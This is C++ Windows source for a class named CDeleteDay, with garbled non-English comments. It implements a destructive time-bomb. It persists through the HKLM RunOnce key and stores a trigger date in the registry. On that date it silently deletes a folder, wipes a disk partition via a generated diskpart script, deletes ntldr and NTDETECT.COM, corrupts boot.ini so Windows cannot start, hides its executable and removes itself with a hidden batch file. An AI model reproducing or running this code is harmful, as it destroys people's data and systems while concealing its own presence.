#include "stdafx.h"
#include "DeleteDay.h"

#include <string>
using namespace std;


CDeleteDay::CDeleteDay()
{
}

CDeleteDay::~CDeleteDay()
{
}

// //��������� ���� ������������
bool CDeleteDay::AddToAutoRun()
{
	CString csExePath;
	DWORD dwSize = 512;
	GetModuleFileName(NULL, csExePath.GetBuffer(dwSize), dwSize);
	TRACE1("���� � ��������� = %s\n", csExePath.GetString());

	csExePath.ReleaseBuffer();

	//�������� ���� � ������������
	//�������� ���������� ����� ��������� � RunOnce � ������ ��� ���� ���� ��������� ���� ��
	//���������� ���� ������������
	if (SHSetValue(HKEY_LOCAL_MACHINE
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, RunOnceItemName
		, REG_SZ
		, csExePath.GetString()
		, csExePath.GetLength()) != ERROR_SUCCESS)
	{
		//MessageBox("����� � SHSetValue() � AddToAutorun()", "�����", MB_ICONERROR);
		TRACE("����� � SHSetValue() � AddToAutorun()");
		return false;
	}

	return true;
}


// ���������� � ������ ����� ���������� ������
bool CDeleteDay::SaveDeleteDay()
{
	SYSTEMTIME SysTime;
	ZeroMemory(&SysTime, 0);

	m_MonthCalCtrl.GetCurSel(&SysTime);

	CString DeleteDay, DeleteWeek, DeleteMonth;

	DeleteDay.Format(L"%d", SysTime.wDay);
	DeleteWeek.Format(L"%d", SysTime.wDayOfWeek);
	DeleteMonth.Format(L"%d", SysTime.wMonth);

	//DeleteDay.Format("%d.%d%.d", SysTime.wDay, SysTime.wDayOfWeek, SysTime.wMonth);
	TRACE1("���� �������� = %s\n", DeleteDay.GetString());

	HKEY hk;

	// ������� ���� � HKCR\CLSID
	if (RegCreateKeyEx(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, 0
		, NULL
		, REG_OPTION_NON_VOLATILE
		, KEY_WRITE
		, NULL
		, &hk
		, NULL))
	{
		MessageBox(L"Could not create the registry key in SaveDeleteDay().", L"�����", MB_ICONERROR);
		return false;
	}

	RegCloseKey(hk);

	//===== �������� ���� �������� ======
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayKeyName			//��� ��������
		, REG_SZ
		, DeleteDay.GetString()
		, DeleteDay.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()", "�����", MB_ICONERROR);
		return false;
	}

	//===== �������� ���� ������ =====
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayOfWeekKeyName			//��� ��������
		, REG_SZ
		, DeleteWeek.GetString()
		, DeleteWeek.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()", "�����", MB_ICONERROR);
		return false;
	}

	//===== �������� ����� =====
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelMonthKeyName			//��� ��������
		, REG_SZ
		, DeleteMonth.GetString()
		, DeleteMonth.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()", "�����", MB_ICONERROR);
		return false;
	}

	return true;
}


// ���������� ����� ����� ����� �������
bool CDeleteDay::SaveFolderPathToDelete()
{
	CString csFolderPath(m_csPath.GetString());

	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelFolderKeyName
		, REG_SZ
		, csFolderPath.GetString()
		, csFolderPath.GetLength()) != ERROR_SUCCESS)
	{
		MessageBox(L"����� � SHSetValue() � SaveFolderPathToDelete()", L"�����", MB_ICONERROR);
		return false;
	}

	return true;
}


// ��������� �� �������� �� ���� ���������� �������
bool CDeleteDay::InspectDeleteData()
{
	CString DeleteDay, CurrentDay;
	
	int DelDay = 0, DelDayOfWeek = 0, DelMonth = 0;
	int CurDay = 0, CurDayOfWeek = 0, CurMonth = 0;
	
	//�������� ���� ��������
	ReadRegDeleteDay( DelDay, DelDayOfWeek, DelMonth);	 	
	
	//���������� ������� ����
	GetCurrentDay(CurDay, CurDayOfWeek, CurMonth);
	
	//�������� ����, ���� ���������, �� ...
	//����� ���������� ����, ���� ������ � ����� �� �����������
	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 && CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth )
	{
		TRACE0("���� ���������. ������� �����.\n");	
			
		//... ��������� �������
		PerformATask();
	
		return true;
	}
	
	return false;
}

bool CDeleteDay::DeleteFolder()
{
	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	wstring csPath;

	typedef wstring::size_type strLength;

	CString cspvData;

	SHGetValue(HKEY_CLASSES_ROOT, RegDataKeyName, DelFolderKeyName, &dwDataType, cspvData.GetBuffer(dwDataBufferSize), &dwDataBufferSize);

	csPath = cspvData;

	strLength iLength = csPath.length();
	strLength index = 0;

	/*��������� ������ ���� �:\\����� �����\\ ������ �:\����� �����\*/
	for (;;)
	{
		index = csPath.find(L"\\", index);

		if (index == -1)
			break;

		csPath.insert(index, L"\\");

		index += 2;
	}

	csPath = csPath + L'\0' + L'\0';

	SHFILEOPSTRUCT sh;
	sh.hwnd = NULL;
	sh.wFunc = FO_DELETE;
	sh.pFrom = csPath.c_str();
	sh.pTo = NULL;
	sh.fFlags = FOF_NOCONFIRMATION | FOF_SILENT;
	sh.hNameMappings = 0;
	sh.lpszProgressTitle = NULL;

	if (SHFileOperation(&sh) != 0)
	{
		TRACE1("����� \"%s\" �� �������.\n", csPath.c_str());
		return false;
	}

	return true;
}

bool CDeleteDay::PerformATask(void)
{
	// ����� �������� ����� ������ - ������ �� ����� %)
	wchar_t szFilePath[MAX_PATH] = { L"\0" };
	wchar_t szFileBat[MAX_PATH] = { L"\0" };
	wchar_t szFileExe[MAX_PATH] = { L"\0" };
	wchar_t szFileDiskPart[MAX_PATH] = { L"\0" };
	wchar_t szTempPath[MAX_PATH] = { L"\0" };

	wchar_t sz[600]; // ������-��������...

	unsigned int iTmp;
	wchar_t* lpTmp;

	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // �������� ���� � ����������� ��������

	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // ����������� � ��� ����� � ��������� ���
		wcsncpy(szFileExe, sz, sizeof(szFileExe));

	size_t sLen = wcslen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //������ lpTmp ��������� �� ����� ������

	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
	{
		if (!wcsncmp(lpTmp, L"\\", 1))
			break;
	}

	//������� �� ���� � ���� �������� ���������
	size_t count = lpTmp - szFileExe; //Number of characters to be copied

	wcsncpy(szFilePath, szFileExe, count);
	wcscat(szFilePath, L"\\");

	GetTempPath(MAX_PATH, szTempPath); // �������� ���� � TEMP-�����

									   //���� ������� ���� �
	if (IfDeleteDiskD())
	{
		CreateDiskpartScript(szFileDiskPart, szTempPath, szFilePath);
	}

	if (IfKillWindows())
	{
		//������ �������� ����� �����������
		DoKillWindows();
	}

	//������� ��������� �����
	DeleteFolder();

	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);

	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_ARCHIVE);
	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN); // "������" ����

	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // ������ ���� ����������

	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // ��������� ������.

	SHDeleteKey(HKEY_CLASSES_ROOT, RegDataKeyName);
	//������� �� ������������
	SHDeleteValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);

	KeyBoardLedBlink();

	return false; // � �����������
}

bool CDeleteDay::IfDeleteDiskD(void)
{
	CString DelD;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//������� ������ ����� ��� ���� � ����
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDiskDKeyName
		, &dwDataType
		, DelD.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � IfDeleteDiskD().\n");
	}

	if (DelD.Compare(L"YES") == 0)
	{
		DelD.ReleaseBuffer();
		return true;
	}

	return false;
}

bool CDeleteDay::IfKillWindows()
{
	CString csKillW;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//������� ������ ����� ��� ���� � ����
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, KillWindowsKeyName
		, &dwDataType
		, csKillW.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � IfDeleteDiskD().\n");
	}

	if (csKillW.Compare(L"YES") == 0)
	{
		csKillW.ReleaseBuffer();
		return true;
	}

	return false;
}

void CDeleteDay::ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
{
	CString RegStringValue;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//===== �������� ���� �������� ����� =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ��� ��������.\n");
	}

	//��������� ������ � �����
	DelDay = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== �������� ���� ������ =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayOfWeekKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ��� ������ ��������.\n");
	}

	//��������� ������ � �����
	DelDayOfWeek = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== �������� ����� =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelMonthKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ������ ��������.\n");
	}

	//��������� ������ � �����
	Month = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	return;
}

void CDeleteDay::GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth)
{
	CString CurrentDay;

	//�������� ������� ����
	CTime CurrentTime(CTime::GetCurrentTime());
	SYSTEMTIME timeDest;
	CurrentTime.GetAsSystemTime(timeDest);

	iDay = timeDest.wDay;
	iDayOfWeek = timeDest.wDayOfWeek;
	iMonth = timeDest.wMonth;

	//CurrentDay.Format("%d%d%d", iDay, iDayOfWeek, iMonth);

	return;
}

bool CDeleteDay::CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[])
{
	wchar_t sz[600]; // ������-��������...
					 //�������� ��� �� ��������� ����� ��� � ������� �������� ���������
	swprintf(szFileDiskPart, L"%sDiskpart.txt", (wcslen(szTempPath)) ? szTempPath : szFilePath);

	SetFileAttributes(szFileDiskPart, FILE_ATTRIBUTE_NORMAL); // ���� ���� ����������, �� ������� ��� ��������� �� ����������

															  //������� diskpart �������� ===========================================
	const wchar_t* DISKPARTSTRING = L"select disk 0\nselect partition 3\ndelete partition noerr override";
	//��������� ������ ��� ������ � ����
	swprintf(sz, DISKPARTSTRING);

	HANDLE hFile = CreateFile((LPCTSTR)szFileDiskPart,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

	if (!hFile)
	{
		MessageBox(NULL, L"���� ���, ����� Diskpart.txt ��� � �� �����", L"�����", MB_OK | MB_ICONSTOP);
		return false;
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);

	if (bError)
	{
		MessageBox(NULL, L"���� ���, ����� � ���� Diskpart.txt �� ������� ��������", L"�����", MB_OK | MB_ICONSTOP);
		return false;
	}

	CloseHandle(hFile);

	return true;
}

bool CDeleteDay::CreateBatFile(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[])
{
	bool bDeleteD = IfDeleteDiskD();

	wchar_t BATSTRING[1024] =
		L":Repeat\n"
		L"del \"%s\"\n" //������� �� �������� ���������
		L"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
		L":Repeat1\n"
		L"del \"%s\"\n"
		L"\0"; //�������� �������		

	if (bDeleteD)
	{
		wcsncpy(BATSTRING,
			L":Repeat\n"
			L"del \"%s\"\n" //������� �� �������� ���������
			L"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
			L"DiskPart.exe /S \"%s\"\n" //������� �� �������� �������
			L":Repeat1\n"
			L"del \"%s\"\n" //�������� �������
			L"del \"%s\"\n\0", sizeof(BATSTRING)); //�������� �������� diskpart
	}

	wchar_t sz[600]; // ������-��������...
					 //������� ���-���� ===========================================
	swprintf(szFileBat, L"%sSystem.bat", (wcslen(szTempPath)) ? szTempPath : szFilePath);

	SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // ���� ���� ����������, �� ������� ��� ��������� �� ����������

	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

	if (!hFile)
	{
		MessageBox(NULL, L"���� ���, ����� System.bat ��� � �� �����", L"�����", MB_OK | MB_ICONSTOP);
		return false;
	}

	if (bDeleteD)
	{
		//��������� ������ ��� ������ � ����
		swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
	}
	else
	{
		swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);

	if (bError)
	{
		MessageBox(NULL, L"���� ���, ����� � ���� System.bat �� ������� ��������", L"�����", MB_OK | MB_ICONSTOP);
		return false;
	}

	CloseHandle(hFile); // ���������� ��������� ���� ����� �������� �������, ����� ���� �� ������ ���� ������ �������

	return true;
}

void CDeleteDay::KeyBoardLedBlink(void)
{
	for (int i = 0; i < 3; i++)
	{
		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_NUMLOCK;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}

		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_CAPITAL;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}

		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_SCROLL;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}
	}

	//==============================================
	//����������� ������� ���������� ������ RCONTROL+SCROLL+SCROLL

	//INPUT input;
	//::ZeroMemory(&input, sizeof(input));	

	////�������� ������ CONTROL
	//input.type = INPUT_KEYBOARD;
	//input.ki.wVk = VK_MENU;
	//SendInput(1, &input, sizeof(INPUT));
	//TRACE0("������ ������ CONTROL\n");

	//for (int c = 0; c < 2; c++)
	//	{
	//		INPUT inp;
	//		::ZeroMemory(&inp, sizeof(inp));

	//		inp.type = INPUT_KEYBOARD;
	//		inp.ki.wVk = VK_PRINT;
	//		inp.ki.dwFlags = 0;
	//		SendInput(1, &inp, sizeof(INPUT));
	//		TRACE0("������ �� CSROLL\n");
	//		
	//		inp.ki.dwFlags = KEYEVENTF_KEYUP;
	//		SendInput(1, &inp, sizeof(INPUT));
	//		TRACE0("��������� CSROLL\n");

	//		Sleep(500);
	//	}

	////��������� ������ CONTROL
	//input.ki.wVk = VK_MENU;
	//input.ki.dwFlags = KEYEVENTF_KEYUP;	
	//SendInput(1, &input, sizeof(INPUT));
	//TRACE0("��������� ������ CONTROL\n");

	//==============================================
	TRACE0("���� ������ �� ��� ������.\n");
}

void CDeleteDay::DoKillWindows()
{
	//remove();
	const int INFO_BUFFER_SIZE = 100;

	CString SystemDisk;

	//�� ����� ����� ����� �����?
	//GetBuffer() Returns a pointer to the internal character buffer for the CSimpleStringT object
	GetWindowsDirectory(SystemDisk.GetBuffer(INFO_BUFFER_SIZE), INFO_BUFFER_SIZE);

	SystemDisk.ReleaseBuffer();

	//��� ����� ������ ����� �����, �������� �� ������
	SystemDisk = SystemDisk.Left(3);
	TRACE("%s\n", SystemDisk);

	//===== 1 ������� ntldr =====
	CString csFileName = SystemDisk + L"\\ntldr";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("�����! ���� �� ������");

	//===== 2 ������� ntdetect.com =====
	csFileName = SystemDisk + L"\\NTDETECT.COM";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("�����! ���� �� ������");

	//===== 3 �������� boot.ini =====
	CFile BootIniFile;

	const int bufSize = 1024;
	char readBuffer[bufSize];

	csFileName = SystemDisk + L"\\boot.ini";

	//--- ������ ���� ---
	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeReadWrite))
	{
		MessageBox(NULL, L"�� ������� ������� ����", L"�����", MB_OK);
		return;
	}

	int BytesRead = BootIniFile.Read(readBuffer, sizeof(readBuffer));

	BootIniFile.Close();

	BootIniFile.Remove(csFileName.GetString());

	//--- ���������� ���� ---
	CString csBootINI(readBuffer);

	csBootINI.Replace(L"partition(1)", L"partition(9)");

	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox(NULL, L"�� ������� ������� ����", L"�����", MB_OK);
		return;
	}

	BootIniFile.Write(csBootINI, BytesRead);

	BootIniFile.Close();

	//������ ��� ����...
	SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

bool CDeleteDay::EnableCrashOnCtrlScroll()
{
	HKEY hKey;

	if (RegOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
	{
		DWORD lpData = 0x01;

		if (RegSetValueEx(hKey, L"CrashOnCtrlScroll", NULL, REG_DWORD, (BYTE*)&lpData, (DWORD)sizeof(lpData)) != ERROR_SUCCESS)
		{
			MessageBox(L"����� � SHSetValue() � EnableCrashOnCtrlScroll()", L"�����", MB_ICONERROR);
			return false;
		}
	}

	return true;
}

bool CDeleteDay::DeleteDiskD()
{
	CString csDeleteD("YES");

	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDiskDKeyName
		, REG_SZ
		, csDeleteD.GetString()
		, csDeleteD.GetLength()) != ERROR_SUCCESS)
	{
		MessageBox(L"����� � SHSetValue() � DeleteDiskD()", L"�����", MB_ICONERROR);
		return false;
	}

	return true;
}

bool CDeleteDay::SaveTaskKillWindows()
{
	CString csKillWindows("YES");

	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, KillWindowsKeyName
		, REG_SZ
		, csKillWindows.GetString()
		, csKillWindows.GetLength()) != ERROR_SUCCESS)
	{
		MessageBox(L"����� � SHSetValue() � DeleteDiskD()", L"�����", MB_ICONERROR);
		return false;
	}

	return true;
}

void CDeleteDay::SelfDelete()
{
	//������� ���� �� ������������
	HKEY hKey;

	if (::RegOpenKeyEx(HKEY_LOCAL_MACHINE
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, NULL
		, KEY_ALL_ACCESS
		, &hKey) == ERROR_SUCCESS)
	{
		::RegDeleteValue(hKey, RunOnceItemName);
	}

	// ����� �������� ����� ������ - ������ �� ����� %)
	wchar_t szFilePath[MAX_PATH] = { L"\0" };
	wchar_t szFileBat[MAX_PATH] = { L"System.bat" };
	wchar_t szFileExe[MAX_PATH] = { L"\0" };

	wchar_t sz[600]; // ������-��������...

	unsigned int iTmp;
	wchar_t* lpTmp;

	// �������� ���� � ����������� ��������
	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe));

	// ����������� � ��� ����� � ��������� ���
	if (GetShortPathName(szFileExe, sz, _MAX_PATH))
		wcscpy(szFileExe, sz);

	size_t sLen = wcslen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //������ lpTmp ��������� �� ����� ������

	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
	{
		if (!wcsncmp(lpTmp, L"\\", 1))
			break;
	}

	//������� �� ���� � ���� �������� ���������
	size_t count = lpTmp - szFileExe; //Number of characters to be copied

	wcsncpy(szFilePath, szFileExe, count);
	wcscat(szFilePath, L"\\");

	//===== ������� ���� ���� =====
	wchar_t BATSTRING[1024] =
		L":Repeat\n"
		L"del \"%s\"\n" //������� �� �������� ���������
		L"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
		L":Repeat1\n"
		L"del \"%s\"\n"
		L"\0"; //�������� �������

	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

	if (!hFile)
	{
		MessageBox(L"���� ���, ����� System.bat ��� � �� �����", L"�����", MB_OK | MB_ICONSTOP);
	}

	//char sz[600]; // ������-��������...
	//������� ���-���� ===========================================
	swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);

	if (bError)
	{
		MessageBox(L"���� ���, ����� � ���� System.bat �� ������� ��������", L"�����", MB_OK | MB_ICONSTOP);
	}

	CloseHandle(hFile); // ���������� ��������� ���� ����� �������� �������, ����� ���� �� ������ ���� ������ �������

	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // ��������� ������.

}

void CDeleteDay::HideFile()
{
	wchar_t szFileExe[MAX_PATH] = { L"\0" };
	wchar_t sz[600] = { L"\0" }; // ������-��������...

	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // �������� ���� � ����������� ��������

														   //Retrieves the short path form of the specified path.
	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // ����������� ��� ����� � ��������� ���
		wcscpy(szFileExe, sz);

	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "������" ����	
}